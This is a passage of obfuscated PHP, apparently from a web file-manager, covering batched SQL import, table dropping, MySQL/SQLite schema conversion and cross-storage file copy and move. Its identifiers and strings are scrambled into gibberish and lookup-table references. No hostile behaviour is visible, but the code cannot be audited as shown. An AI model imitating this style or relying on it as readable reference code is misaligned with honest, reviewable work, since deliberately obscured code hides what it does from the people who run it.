$ê¨‡”[787]); $Ó†ª¬« = 0; $©¥ãì€ó = 4194304 - 104858; $«¹¿‡Ï¾ = 1000000 - 104858; while (!feof($ÄŞ‡ªßº)) { $ˆ›ã³­ = trim(fgets($ÄŞ‡ªßº)); if (!$ˆ›ã³­) { continue; } $ÉŞ•ÑÜì = $this->sqlDecode($ˆ›ã³­, $À¼ËÚƒ, $Ò»ûÂîÂ); if (stripos($ÉŞ•ÑÜì, $ê¨‡”[355]) === 0) { if (!$ŠÑ¬ñ‡Æ) { $ŠÑ¬ñ‡Æ = $ÉŞ•ÑÜì . $ê¨‡”[53]; } continue; } if ($Åî‚†èØ) { $Åî‚†èØ->task[$ê¨‡”[785]] += 1; } $¸Îé…òï++; $Ìí¾íç[] = rtrim(rtrim(trim($ÉŞ•ÑÜì), $ê¨‡”[50]), $ê¨‡”[71]); $›Œ’«øÜ = null; $à«€„™ = strlen($ÉŞ•ÑÜì); $Ó†ª¬« += $à«€„™; if ($Ó†ª¬« >= ($£ÉÌ±„è == 500 ? $«¹¿‡Ï¾ : $©¥ãì€ó)) { $›Œ’«øÜ = array_pop($Ìí¾íç); if ($¸Îé…òï > 1) { $¸Îé…òï--; } } if ($¸Îé…òï >= $£ÉÌ±„è || $›Œ’«øÜ) { $ÉŞ•ÑÜì = $ŠÑ¬ñ‡Æ . implode($ê¨‡”[50], $Ìí¾íç); if (!$Èıİš¬ì->execute($ÉŞ•ÑÜì)) { return !1; } if ($Åî‚†èØ) { $Åî‚†èØ->update($¸Îé…òï); } $Ìí¾íç = array(); $¸Îé…òï = 0; $Ó†ª¬« = 0; if ($›Œ’«øÜ) { $Ìí¾íç = array($›Œ’«øÜ); $¸Îé…òï = 1; $Ó†ª¬« = $à«€„™; } } } fclose($ÄŞ‡ªßº); if (!empty($Ìí¾íç)) { $ÉŞ•ÑÜì = $ŠÑ¬ñ‡Æ . implode($ê¨‡”[50], $Ìí¾íç); if (!$Èıİš¬ì->execute($ÉŞ•ÑÜì)) { return !1; } if ($Åî‚†èØ) { $Åî‚†èØ->update($¸Îé…òï); } } return !0; } public function dropTable($¢ı¾‹ºÉ = null) { $Ñ§ÒŞû = $this->model()->db(); $¥… ¹ìÖ = $¢ı¾‹ºÉ ? array($¢ı¾‹ºÉ) : $Ñ§ÒŞû->getTables(); if (!$¥… ¹ìÖ) { return; } foreach ($¥… ¹ìÖ as $¢ı¾‹ºÉ) { if ($¢ı¾‹ºÉ) { $¢ı¾‹ºÉ = strtolower($¢ı¾‹ºÉ); } else { continue; } $Ñ§ÒŞû->execute("\144\x72\x6f\x70\40\x74\x61\x62\154\145\x20\151\x66\x20\145\x78\151\x73\x74\x73\x20\x60{$¢ı¾‹ºÉ}\x60"); } } private function sqlEncode($ãù¢¨ç) { $Ğ˜˜ùØÖ =& $_SERVER[Îûáû“ş]; $ùğï„ëõ = array(); foreach ($ãù¢¨ç as $¢£ñ¨¯Ì) { if (is_array($¢£ñ¨¯Ì)) { $¢£ñ¨¯Ì = json_encode_force($¢£ñ¨¯Ì); } $¢£ñ¨¯Ì = addslashes($¢£ñ¨¯Ì); $¢£ñ¨¯Ì = str_replace(array($Ğ˜˜ùØÖ[1080], $Ğ˜˜ùØÖ[231]), array($Ğ˜˜ùØÖ[1081], $Ğ˜˜ùØÖ[1082]), $¢£ñ¨¯Ì); $ùğï„ëõ[] = str_replace($Ğ˜˜ùØÖ[58], $Ğ˜˜ùØÖ[1083], $¢£ñ¨¯Ì); } return $Ğ˜˜ùØÖ[58] . implode($Ğ˜˜ùØÖ[1084], $ùğï„ëõ) . $Ğ˜˜ùØÖ[58]; } private function sqlDecode($ø¸¨ûû’, $Ôö¹¶æ£, $òˆ³ëÚª = '') { $ûõßß =& $_SERVER[Îûáû“ş]; $ø¸¨ûû’ = str_replace(array($ûõßß[1081], $ûõßß[1082]), array($ûõßß[1080], $ûõßß[231]), $ø¸¨ûû’); if ($Ôö¹¶æ£ == $ûõßß[13]) { return $òˆ³ëÚª != $ûõßß[1085] ? stripslashes($ø¸¨ûû’) : $ø¸¨ûû’; } if ($òˆ³ëÚª == $ûõßß[1085]) { $ø¸¨ûû’ = str_replace($ûõßß[1086], $ûõßß[118], stripslashes($ø¸¨ûû’)); } return $ø¸¨ûû’; } public function getSqlFile($çÍ“çÄ = '') { $Ùö²…Í† =& $_SERVER[Îûáû“ş]; $ŞÓÂº³ = $this->dbType(!0); $é±ÇÂ’ä = CONTROLLER_DIR . "\151\x6e\163\164\x61\154\154\x2f\x64\141\164\x61\57{$ŞÓÂº³}\x2e\x73\161\154"; $¸ßÌÚª = file_get_contents($é±ÇÂ’ä); $ôÅöˆ = $Ùö²…Í†[1087] . ($ŞÓÂº³ == $Ùö²…Í†[803] ? $Ùö²…Í†[1088] : $Ùö²…Í†[1089]) . $Ùö²…Í†[1090]; preg_match_all($ôÅöˆ, $¸ßÌÚª, $ÊãÑ¶ï‰); $Œäõù¾ = $ÊãÑ¶ï‰[1]; $Ê¬Ü»¸º = $this->model()->db(); $…ÑùùŞ = $Ê¬Ü»¸º->getTables(); $š–å¬¯ = TEMP_FILES . $Ùö²…Í†[1091] . date($Ùö²…Í†[749]) . $Ùö²…Í†[8]; del_dir($š–å¬¯); mk_dir($š–å¬¯); $ûéã‘š¬ = $š–å¬¯ . $Ùö²…Í†[1092]; $¨ÛÜÚ¥® = $š–å¬¯ . $Ùö²…Í†[1093]; $•Àùó× = $ŞÓÂº³ == $Ùö²…Í†[13] ? $Ùö²…Í†[803] : $Ùö²…Í†[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\163\x74\141\x6c\154\57\x64\x61\164\141\x2f{$•Àùó×}\56\x73\x71\x6c", $š–å¬¯); @touch($š–å¬¯ . $ŞÓÂº³ . $Ùö²…Í†[787]); $ÏÎÚÜª­ = fopen($ûéã‘š¬, $Ùö²…Í†[1068]); $Ï·¶ÊÉ = fopen($¨ÛÜÚ¥®, $Ùö²…Í†[1068]); if ($ŞÓÂº³ == $Ùö²…Í†[13]) { $…ÑùùŞ = array_diff($…ÑùùŞ, array($Ùö²…Í†[783], $Ùö²…Í†[784])); $×áÚ²Áü = array($Ùö²…Í†[1094], $Ùö²…Í†[1095], $Ùö²…Í†[1096]); fwrite($Ï·¶ÊÉ, implode(PHP_EOL, $×áÚ²Áü) . PHP_EOL . PHP_EOL); foreach ($…ÑùùŞ as $×È¶ú™) { $¾º–æ¶È = $this->sqlFromSqlite($×È¶ú™); if (!$¾º–æ¶È[$Ùö²…Í†[13]]) { continue; } fwrite($Ï·¶ÊÉ, $¾º–æ¶È[$Ùö²…Í†[13]] . PHP_EOL . PHP_EOL); if (!in_array($×È¶ú™, $Œäõù¾)) { fwrite($ÏÎÚÜª­, $¾º–æ¶È[$Ùö²…Í†[803]] . PHP_EOL . PHP_EOL); } } } else { foreach ($…ÑùùŞ as $×È¶ú™) { $¾º–æ¶È = $this->sqlFromMysql($×È¶ú™); if (!$¾º–æ¶È[$Ùö²…Í†[803]]) { continue; } fwrite($ÏÎÚÜª­, $¾º–æ¶È[$Ùö²…Í†[803]] . PHP_EOL . PHP_EOL); if (!in_array($×È¶ú™, $Œäõù¾)) { fwrite($Ï·¶ÊÉ, $¾º–æ¶È[$Ùö²…Í†[13]] . PHP_EOL . PHP_EOL); } } } fclose($ÏÎÚÜª­); fclose($Ï·¶ÊÉ); $¸ßÌÚª = array($Ùö²…Í†[803] => $ûéã‘š¬, $Ùö²…Í†[13] => $¨ÛÜÚ¥®); return $çÍ“çÄ ? $¸ßÌÚª[$çÍ“çÄ] : $¸ßÌÚª; } public function dbType($´˜Ù©ª› = false) { $¡÷¹½«è =& $_SERVER[Îûáû“ş]; $”ñ¥â—Š = $´˜Ù©ª› ? $GLOBALS[$¡÷¹½«è[6]][$¡÷¹½«è[21]] : $this->database; $”ñ¥â—Š = array_change_key_case($”ñ¥â—Š); $º­¾›‡® = $”ñ¥â—Š[$¡÷¹½«è[969]]; if ($º­¾›‡® == $¡÷¹½«è[966]) { $˜Ğ Ê×Ä = explode($¡÷¹½«è[4], $”ñ¥â—Š[$¡÷¹½«è[975]]); $º­¾›‡® = $˜Ğ Ê×Ä[0]; } $úùš“¯ş = array($¡÷¹½«è[1097] => $¡÷¹½«è[13], $¡÷¹½«è[914] => $¡÷¹½«è[803]); if (isset($úùš“¯ş[$º­¾›‡®])) { $º­¾›‡® = $úùš“¯ş[$º­¾›‡®]; } return $º­¾›‡®; } public function sqlFromMysql($§Ö¿ÜÌ£, $×¿Åï¡ª = '') { $Ø­Š©³ß =& $_SERVER[Îûáû“ş]; $Ùâ¾ñ˜œ = $this->model()->db(); $ş€¡ı´¢ = $Ùâ¾ñ˜œ->query($Ø­Š©³ß[1098] . $§Ö¿ÜÌ£ . $Ø­Š©³ß[385]); if (!$ş€¡ı´¢ || !$ş€¡ı´¢[0]) { return !1; } $ŒŒŠùùˆ = _get($ş€¡ı´¢[0], $Ø­Š©³ß[1099], $Ø­Š©³ß[12]); if (!$ŒŒŠùùˆ) { return !1; } $ƒèèÛ…é = "\x44\x52\x4f\120\x20\x54\101\x42\114\x45\40\x49\x46\40\x45\x58\111\123\124\123\x20\x60{$§Ö¿ÜÌ£}\x60\x3b" . PHP_EOL . $ŒŒŠùùˆ . $Ø­Š©³ß[71]; if ($×¿Åï¡ª && $×¿Åï¡ª == $Ø­Š©³ß[803]) { return $ƒèèÛ…é; } $±£€Ù‘ = array_change_key_case($GLOBALS[$Ø­Š©³ß[6]][$Ø­Š©³ß[21]]); $€Å†Ÿ¸¯ = $±£€Ù‘[$Ø­Š©³ß[974]]; $Â¾³ú”÷ = $Ø­Š©³ß[1100] . $€Å†Ÿ¸¯ . $Ø­Š©³ß[1101] . $§Ö¿ÜÌ£ . $Ø­Š©³ß[58]; $áÕ‡¬Ï = $Ø­Š©³ß[1102] . $§Ö¿ÜÌ£ . $Ø­Š©³ß[902]; $¨Ã±§ü¬ = $Ùâ¾ñ˜œ->query($Â¾³ú”÷); if (empty($¨Ã±§ü¬)) { $§Ñäªª­ = array($Ø­Š©³ß[803] => $Ø­Š©³ß[12], $Ø­Š©³ß[13] => $Ø­Š©³ß[12]); return $×¿Åï¡ª ? $§Ñäªª­[$×¿Åï¡ª] : $§Ñäªª­; } $‹Í—áäò = $Ùâ¾ñ˜œ->query($áÕ‡¬Ï); $ÕÂ„¡‡¸ = $Ø­Š©³ß[12]; $ôÃÂòØø = array(); foreach ($‹Í—áäò as $’ß„îĞì) { if (!$ÕÂ„¡‡¸ && $’ß„îĞì[$Ø­Š©³ß[1103]] == $Ø­Š©³ß[1104]) { $ÕÂ„¡‡¸ = $’ß„îĞì[$Ø­Š©³ß[1105]]; } if (isset($ôÃÂòØø[$’ß„îĞì[$Ø­Š©³ß[1103]]])) { $ôÃÂòØø[$’ß„îĞì[$Ø­Š©³ß[1103]]][$Ø­Š©³ß[1106]][] = $’ß„îĞì[$Ø­Š©³ß[1105]]; continue; } $ôÃÂòØø[$’ß„îĞì[$Ø­Š©³ß[1103]]] = array($Ø­Š©³ß[1107] => $’ß„îĞì[$Ø­Š©³ß[1103]], $Ø­Š©³ß[1106] => array($’ß„îĞì[$Ø­Š©³ß[1105]]), $Ø­Š©³ß[1108] => $’ß„îĞì[$Ø­Š©³ß[1109]] == $Ø­Š©³ß[88] ? 0 : 1); } $œ¾¢›À = array(); foreach ($ôÃÂòØø as $’ß„îĞì) { $¢ö²£ = $’ß„îĞì[$Ø­Š©³ß[1107]] == $Ø­Š©³ß[1104]; $Ø—Œ£è = array($Ø­Š©³ß[1110], $’ß„îĞì[$Ø­Š©³ß[1108]] == $Ø­Š©³ß[88] && !$¢ö²£ ? $Ø­Š©³ß[1111] : $Ø­Š©³ß[12], $Ø­Š©³ß[1112], $Ø­Š©³ß[1113] . $§Ö¿ÜÌ£ . $Ø­Š©³ß[11] . ($¢ö²£ ? $Ø­Š©³ß[1114] : $’ß„îĞì[$Ø­Š©³ß[1107]]) . $Ø­Š©³ß[118], $Ø­Š©³ß[1115], $Ø­Š©³ß[118] . $§Ö¿ÜÌ£ . $Ø­Š©³ß[118], $Ø­Š©³ß[1116] . implode($Ø­Š©³ß[1117], $’ß„îĞì[$Ø­Š©³ß[1106]]) . $Ø­Š©³ß[1118]); $œ¾¢›À[] = implode($Ø­Š©³ß[53], $Ø—Œ£è) . $Ø­Š©³ß[71]; } $ã™ÀÃ‘ = array(); $ÁİˆÜ‰ = array($Ø­Š©³ß[1119] => $Ø­Š©³ß[1120], $Ø­Š©³ß[1120] => $Ø­Š©³ß[1120], $Ø­Š©³ß[288] => $Ø­Š©³ß[315], $Ø­Š©³ß[287] => $Ø­Š©³ß[315]); foreach ($¨Ã±§ü¬ as $’ß„îĞì) { $Ø—Œ£è = array($Ø­Š©³ß[118] . $’ß„îĞì[$Ø­Š©³ß[1121]] . $Ø­Š©³ß[118], isset($ÁİˆÜ‰[$’ß„îĞì[$Ø­Š©³ß[1122]]]) ? $ÁİˆÜ‰[$’ß„îĞì[$Ø­Š©³ß[1122]]] : $’ß„îĞì[$Ø­Š©³ß[1123]], $’ß„îĞì[$Ø­Š©³ß[1124]] == $Ø­Š©³ß[900] ? $Ø­Š©³ß[1125] : $Ø­Š©³ß[1126], $’ß„îĞì[$Ø­Š©³ß[1121]] == $ÕÂ„¡‡¸ ? $Ø­Š©³ß[1127] : $Ø­Š©³ß[12], $’ß„îĞì[$Ø­Š©³ß[951]] ? strtoupper(str_replace($Ø­Š©³ß[11], $Ø­Š©³ß[12], $’ß„îĞì[$Ø­Š©³ß[951]])) : $Ø­Š©³ß[12]); $ã™ÀÃ‘[] = trim(implode($Ø­Š©³ß[53], $Ø—Œ£è)); } $ì³Ôñğå = array($Ø­Š©³ß[1128] . $§Ö¿ÜÌ£ . $Ø­Š©³ß[1129], $Ø­Š©³ß[1130] . $§Ö¿ÜÌ£ . $Ø­Š©³ß[1131], implode($Ø­Š©³ß[50] . PHP_EOL, $ã™ÀÃ‘), $Ø­Š©³ß[948]); $çÛú—ï = implode(PHP_EOL, array_merge($ì³Ôñğå, $œ¾¢›À)); if ($×¿Åï¡ª && $×¿Åï¡ª == $Ø­Š©³ß[13]) { return $çÛú—ï; } $§Ñäªª­ = array($Ø­Š©³ß[803] => $ƒèèÛ…é, $Ø­Š©³ß[13] => $çÛú—ï); return $×¿Åï¡ª ? $§Ñäªª­[$×¿Åï¡ª] : $§Ñäªª­; } public function sqlFromSqlite($ñ¹°ÀÔ§, $½òş¤Ù“ = '') { $­¤É—î· =& $_SERVER[Îûáû“ş]; $ÄèÆÈĞ = $this->model()->db(); $çñÚÎªó = "\x50\x52\x41\x47\115\101\40\x54\x41\x42\114\x45\137\x49\x4e\x46\x4f\x20\50\47{$ñ¹°ÀÔ§}\47\51"; $«óÍ¢÷Œ = "\x53\105\114\105\x43\x54\x20\x2a\x20\x46\x52\x4f\115\40\163\161\154\x69\x74\x65\x5f\155\141\163\164\145\x72\40\127\110\105\122\x45\40\164\x62\x6c\137\156\x61\x6d\x65\40\75\40\47{$ñ¹°ÀÔ§}\47"; $±±¤·Ü´ = $ÄèÆÈĞ->query($çñÚÎªó); if (empty($±±¤·Ü´)) { $²ôëíĞœ = array($­¤É—î·[803] => $­¤É—î·[12], $­¤É—î·[13] => $­¤É—î·[12]); return $½òş¤Ù“ ? $²ôëíĞœ[$½òş¤Ù“] : $²ôëíĞœ; } $šæÄç  = $ÄèÆÈĞ->query($«óÍ¢÷Œ); $§ü±ÇŒ = $©¾ú«ú = array(); foreach ($šæÄç  as $ ßî‘óù) { if ($ ßî‘óù[$­¤É—î·[33]] == $­¤É—î·[279]) { $§ü±ÇŒ[] = $ ßî‘óù[$­¤É—î·[1132]]; } else { $©¾ú«ú[$ ßî‘óù[$­¤É—î·[32]]] = $ ßî‘óù[$­¤É—î·[1132]]; } } $ùÔÍë = array_merge(array($­¤É—î·[1128] . $ñ¹°ÀÔ§ . $­¤É—î·[118]), $§ü±ÇŒ, array_values($©¾ú«ú)); $ùÔÍë = implode($­¤É—î·[71] . PHP_EOL, $ùÔÍë) . $­¤É—î·[71]; if ($½òş¤Ù“ && $½òş¤Ù“ == $­¤É—î·[13]) { return $ùÔÍë; } $Í¶ì…Ä = array(); $éˆ„çàÕ = array($­¤É—î·[1120] => $­¤É—î·[1133], $­¤É—î·[315] => $­¤É—î·[1134]); $ç‡¥ıİ¾ = $­¤É—î·[12]; foreach ($±±¤·Ü´ as $ ßî‘óù) { if ($ ßî‘óù[$­¤É—î·[57]] == $­¤É—î·[88]) { $ç‡¥ıİ¾ = $ ßî‘óù[$­¤É—î·[32]]; } $€òçÄ÷ = array($­¤É—î·[385] . $ ßî‘óù[$­¤É—î·[32]] . $­¤É—î·[385], isset($éˆ„çàÕ[$ ßî‘óù[$­¤É—î·[33]]]) ? $éˆ„çàÕ[$ ßî‘óù[$­¤É—î·[33]]] : $ ßî‘óù[$­¤É—î·[33]], $ ßî‘óù[$­¤É—î·[35]] == $­¤É—î·[88] ? $­¤É—î·[1125] : $­¤É—î·[1135] . $ ßî‘óù[$­¤É—î·[56]], $ ßî‘óù[$­¤É—î·[57]] == $­¤É—î·[88] ? $­¤É—î·[1136] : $­¤É—î·[12]); $Í¶ì…Ä[] = trim(implode($­¤É—î·[53], $€òçÄ÷)); } foreach ($©¾ú«ú as $¤Ô×åÛà => $øî»·ß¹) { $è¦ÎàÆ = str_replace($­¤É—î·[1137] . $ñ¹°ÀÔ§ . $­¤É—î·[11], $­¤É—î·[12], $¤Ô×åÛà); $÷²¬Ü¦ = str_replace(array($­¤É—î·[118], $­¤É—î·[959]), $­¤É—î·[385], substr($øî»·ß¹, stripos($øî»·ß¹, $­¤É—î·[260]))); if ($è¦ÎàÆ == $­¤É—î·[1114]) { $¢€®¡¥Û = $­¤É—î·[1138] . $ç‡¥ıİ¾ . $­¤É—î·[1139]; } else { $¢€®¡¥Û = (stripos($è¦ÎàÆ, $­¤É—î·[11]) ? $­¤É—î·[1140] : $­¤É—î·[12]) . ($­¤É—î·[1141] . $è¦ÎàÆ . $­¤É—î·[1142] . $÷²¬Ü¦); } $Í¶ì…Ä[] = $¢€®¡¥Û; } $ûÍÍ´Ÿ† = array($­¤É—î·[1143] . $ñ¹°ÀÔ§ . $­¤É—î·[1144], $­¤É—î·[1145] . $ñ¹°ÀÔ§ . $­¤É—î·[1146], implode($­¤É—î·[50] . PHP_EOL, $Í¶ì…Ä), $­¤É—î·[1147]); $Œ•Ê¬áŞ = implode(PHP_EOL, $ûÍÍ´Ÿ†); if ($½òş¤Ù“ && $½òş¤Ù“ == $­¤É—î·[803]) { return $Œ•Ê¬áŞ; } $²ôëíĞœ = array($­¤É—î·[803] => $Œ•Ê¬áŞ, $­¤É—î·[13] => $ùÔÍë); return $½òş¤Ù“ ? $²ôëíĞœ[$½òş¤Ù“] : $²ôëíĞœ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($Áï÷÷ë , $úøöÖÀã) { $à‚˜½ïÕ =& $_SERVER[Îûáû“ş]; $×àÄäÊè = $úøöÖÀã; $GLOBALS[$à‚˜½ïÕ[1148]] = $à‚˜½ïÕ[1149] . $Áï÷÷ë ; Hook::trigger($à‚˜½ïÕ[1149] . $Áï÷÷ë  . $à‚˜½ïÕ[1150], $×àÄäÊè); $¸Òò„§à = self::driverMake($úøöÖÀã[0]); if (!$¸Òò„§à) { return !1; } if (method_exists($¸Òò„§à, $Áï÷÷ë )) { $î æ£ğ = @call_user_func_array(array($¸Òò„§à, $Áï÷÷ë ), $úøöÖÀã); } else { if (method_exists($¸Òò„§à, $à‚˜½ïÕ[1151])) { $î æ£ğ = @call_user_func_array(array($¸Òò„§à, $Áï÷÷ë ), $úøöÖÀã); } else { if (method_exists(self, $Áï÷÷ë )) { $î æ£ğ = @call_user_func_array(array(self, $Áï÷÷ë ), $úøöÖÀã); } else { $î æ£ğ = call_user_func_array(array(parent, $Áï÷÷ë ), $úøöÖÀã); } } } Hook::trigger($à‚˜½ïÕ[1149] . $Áï÷÷ë  . $à‚˜½ïÕ[1152], $×àÄäÊè, $î æ£ğ); return $î æ£ğ; } public static function init($„õò•‹) { return self::driverMake($„õò•‹); } public static function copy($¥ğçâÕ•, $ ÏìéŞ¤, $Œöç÷ğ = false, $öü İµï = false) { return self::copyMoveStart($¥ğçâÕ•, $ ÏìéŞ¤, $Œöç÷ğ, $_SERVER[Îûáû“ş][546], $öü İµï); } public static function move($ĞåÊˆ¾­, $´¢‰Ôå, $˜§½œ¿ = false, $ëå¬›á = false) { return self::copyMoveStart($ĞåÊˆ¾­, $´¢‰Ôå, $˜§½œ¿, $_SERVER[Îûáû“ş][548], $ëå¬›á); } private static function copyMoveStart($ìÒªÌñÃ, $¾éÛüúæ, $Š‡Â‚ó±, $Ãƒ™†ñ–, $ÀÛê³ô›) { $¼’—ÙÎ =& $_SERVER[Îûáû“ş]; $ìòÀÁ = array($ìÒªÌñÃ, $¾éÛüúæ, $Š‡Â‚ó±, $ÀÛê³ô›); Hook::trigger($¼’—ÙÎ[1149] . $Ãƒ™†ñ– . $¼’—ÙÎ[1150], $ìòÀÁ); $·ÒêŠ¦š = self::copyMove($ìÒªÌñÃ, $¾éÛüúæ, $Š‡Â‚ó±, $Ãƒ™†ñ–, $ÀÛê³ô›); Hook::trigger($¼’—ÙÎ[1149] . $Ãƒ™†ñ– . $¼’—ÙÎ[1152], $ìòÀÁ, $·ÒêŠ¦š); return $·ÒêŠ¦š; } public static function saveFile($ïèÉ³ËÏ, $œãÀÎë, $‘ıô´µÛ = true) { $’”´š†ë =& $_SERVER[Îûáû“ş]; $—ƒã–˜ = self::info($œãÀÎë); $Ã²¨Ù = self::driverMake($ïèÉ³ËÏ); $ˆş–÷÷É = self::driverMake($œãÀÎë); $ù¾Ìš = !1; if ($ˆş–÷÷É->pathParse[$’”´š†ë[1153]]) { $ù¾Ìš = $ˆş–÷÷É; $²ÚæÂˆ° = $ˆş–÷÷É->pathParse[$’”´š†ë[1153]]; $ˆş–÷÷É = self::driverMake($²ÚæÂˆ°); } if ($Ã²¨Ù->pathParse[$’”´š†ë[1153]]) { $ß©å¬ = $Ã²¨Ù->pathParse[$’”´š†ë[1153]]; $Ã²¨Ù = self::driverMake($ß©å¬); } $¹÷·‹ = $ˆş–÷÷É->pathFather($œãÀÎë); $¤ËÑÛÅ¹ = !0; if (!$‘ıô´µÛ && self::driverIsSame($Ã²¨Ù, $ˆş–÷÷É)) { $¤ËÑÛÅ¹ = !1; } $ÏßĞ¹àª = self::copyFile($Ã²¨Ù, $ïèÉ³ËÏ, $ˆş–÷÷É, $¹÷·‹, $—ƒã–˜[$’”´š†ë[32]], $¤ËÑÛÅ¹); if ($ù¾Ìš) { $ÏßĞ¹àª = $ù¾Ìš->getPathOuter($ÏßĞ¹àª); } return $ÏßĞ¹àª; } private static function copyMove($¹İ…££¯, $â‚•ìÏ, $Š¿¿éù , $‰Ãå ¼, $õ ­èï÷ = false) { $…¥™öƒ„ =& $_SERVER[Îûáû“ş]; if (!$¹İ…££¯ || $¹İ…££¯ == $…¥™öƒ„[8] || !$â‚•ìÏ) { return !1; } ignore_timeout(); $©Ó¾ğç´ = self::driverMake($¹İ…££¯); $ä»ØË¾ = self::driverMake($â‚•ìÏ); $ß·Æ†øƒ = $‰Ãå ¼ == $…¥™öƒ„[548]; $ãëçŠ´š = !1; if ($ä»ØË¾->pathParse[$…¥™öƒ„[1153]]) { $ãëçŠ´š = $ä»ØË¾; $â‚•ìÏ = $ä»ØË¾->pathParse[$…¥™öƒ„[1153]]; $ä»ØË¾ = self::driverMake($â‚•ìÏ); } if ($©Ó¾ğç´->pathParse[$…¥™öƒ„[1153]]) { $¹İ…££¯ = $©Ó¾ğç´->pathParse[$…¥™öƒ„[1153]]; $©Ó¾ğç´ = self::driverMake($¹İ…££¯); } self::check($©Ó¾ğç´, $¹İ…££¯, $ä»ØË¾, $â‚•ìÏ); Hook::trigger($…¥™öƒ„[1154], $©Ó¾ğç´, $¹İ…££¯, $ä»ØË¾, $â‚•ìÏ); $áŠœµº­ = self::driverIsSame($©Ó¾ğç´, $ä»ØË¾); if ($áŠœµº­) { if ($‰Ãå ¼ == $…¥™öƒ„[548] && !method_exists($ä»ØË¾, $…¥™öƒ„[1155]) && trim($â‚•ìÏ, $…¥™öƒ„[8]) == trim($ä»ØË¾->pathFather($¹İ…££¯), $…¥™öƒ„[8])) { if ($©Ó¾ğç´->pathThis($¹İ…££¯) != $õ ­èï÷ && !$©Ó¾ğç´->isTypeObject()) { return $©Ó¾ğç´->rename($¹İ…££¯, $õ ­èï÷); } return $ä»ØË¾->getPathOuter($¹İ…££¯); } if (method_exists($ä»ØË¾, $‰Ãå ¼)) { return $ä»ØË¾->{$‰Ãå ¼}($¹İ…££¯, $â‚•ìÏ, $Š¿¿éù , $õ ­èï÷); } } if ($áŠœµº­ && $‰Ãå ¼ == $…¥™öƒ„[548] && $ä»ØË¾->getType() == $…¥™öƒ„[106]) { $¥òÀÒüà = $ä»ØË¾->movePath($¹İ…££¯, $â‚•ìÏ, $õ ­èï÷); if ($¥òÀÒüà) { return $¥òÀÒüà; } } $ˆİ÷ã¾Ê = $©Ó¾ğç´->isFile($¹İ…££¯); if (!$ˆİ÷ã¾Ê && $ä»ØË¾->getType() == $…¥™öƒ„[756] && $©Ó¾ğç´->getType() == $…¥™öƒ„[106]) { $¥òÀÒüà = $ä»ØË¾->copyFolderFromIO($©Ó¾ğç´, $¹İ…££¯, $â‚•ìÏ, $Š¿¿éù , $ß·Æ†øƒ, $õ ­èï÷); } else { $¥òÀÒüà = self::copyPath($©Ó¾ğç´, $¹İ…££¯, $ä»ØË¾, $â‚•ìÏ, $Š¿¿éù , $ß·Æ†øƒ, $ˆİ÷ã¾Ê, $õ ­èï÷); } if ($¥òÀÒüà && $ß·Æ†øƒ) { $©Ó¾ğç´->remove($¹İ…££¯); } if ($ãëçŠ´š) { $¥òÀÒüà = $ãëçŠ´š->getPathOuter($¥òÀÒüà); } return $¥òÀÒüà; } private static function check($©ŸÒÙ, $¯¢”¾çÛ, $½¨×£û×, &$´Â£Ÿï) { $¸ ¤ˆÇö =& $_SERVER[Îûáû“ş]; if (self::driverIsSame($©ŸÒÙ, $½¨×£û×) && $©ŸÒÙ->isFolder($¯¢”¾çÛ) && $©ŸÒÙ->isParentOf($¯¢”¾çÛ, $´Â£Ÿï)) { show_json(LNG($¸ ¤ˆÇö[1156]), !1); } if (!$©ŸÒÙ->exist($¯¢”¾çÛ)) { show_json(LNG($¸ ¤ˆÇö[105]), !1); } } private static function copyPath($ë¼ìßøÚ, $øšäùˆ”, $„øÇ¼‰ü, $ÍÕñ–¾Œ, $‡õıˆ›, $ğı±•œ, $ÃòË‚Ô¬, $­‚â­éƒ = false, $ÄÄãç¨ = true) { $ÛÑÀğÈ =& $_SERVER[Îûáû“ş]; $’Ô¡ö¹¹ = empty($­‚â­éƒ) && $­‚â­éƒ !== $ÛÑÀğÈ[198] ? $ë¼ìßøÚ->pathThis($øšäùˆ”) : $­‚â­éƒ; if ($‡õıˆ›) { $’Ò–ˆ­Ø = $„øÇ¼‰ü->fileNameExist($ÍÕñ–¾Œ, $’Ô¡ö¹¹); $æÒ³­Ñ¡ = $’Ô¡ö¹¹; $’Ô¡ö¹¹ = $„øÇ¼‰ü->fileNameAuto($ÍÕñ–¾Œ, $’Ô¡ö¹¹, $‡õıˆ›, !$ÃòË‚Ô¬); if (!$’Ò–ˆ­Ø || $æÒ³­Ñ¡ != $’Ô¡ö¹¹) { $‡õıˆ› = !1; } if ($ÄÄãç¨ && !$‡õıˆ›) { $„øÇ¼‰ü->_data[$ÛÑÀğÈ[1157]] = !0; } } if ($ÃòË‚Ô¬) { return self::copyFile($ë¼ìßøÚ, $øšäùˆ”, $„øÇ¼‰ü, $ÍÕñ–¾Œ, $’Ô¡ö¹¹, $ğı±•œ); } if ($‡õıˆ› == REPEAT_RENAME_FOLDER) { $‡õıˆ› = !1; } $‚—‚Ô°õ = rtrim($ÍÕñ–¾Œ, $ÛÑÀğÈ[8]) . $ÛÑÀğÈ[8] . $’Ô¡ö¹¹; $§Ç†¡Î‰ = $„øÇ¼‰ü->mkdir($„øÇ¼‰ü->getPath($‚—‚Ô°õ), $‡õıˆ›); $ÍÕñ–¾Œ = $„øÇ¼‰ü->getPathInner($§Ç†¡Î‰); $€÷Ó†Ù” = $ë¼ìßøÚ->listPath($øšäùˆ”, !0); $€÷Ó†Ù” = is_array($€÷Ó†Ù”) ? $€÷Ó†Ù” : array($ÛÑÀğÈ[83] => array(), $ÛÑÀğÈ[82] => array()); $ı¢§á¾¾ = array_merge($€÷Ó†Ù”[$ÛÑÀğÈ[83]], $€÷Ó†Ù”[$ÛÑÀğÈ[82]]); foreach ($ı¢§á¾¾ as $¶ßö‚ÌÃ) { $î»†ó½‰ = $¶ßö‚ÌÃ[$ÛÑÀğÈ[33]] == $ÛÑÀğÈ[200]; $øšäùˆ” = $ë¼ìßøÚ->getPathInner($¶ßö‚ÌÃ[$ÛÑÀğÈ[84]]); $å¦ÆŞ = self::copyPath($ë¼ìßøÚ, $øšäùˆ”, $„øÇ¼‰ü, $ÍÕñ–¾Œ, $‡õıˆ›, $ğı±•œ, $î»†ó½‰, !1, !1); if (!$å¦ÆŞ) { IO::errorTips($ÛÑÀğÈ[1158] . $øšäùˆ” . $ÛÑÀğÈ[70] . $ÍÕñ–¾Œ); } } self::copyMoveKeepInfo($ë¼ìßøÚ, $øšäùˆ”, $§Ç†¡Î‰); return $§Ç†¡Î‰; } private static function copyFile($â†Éª©‚, $Ã²š¨ÆÑ, $°µÑ¤ş‰, 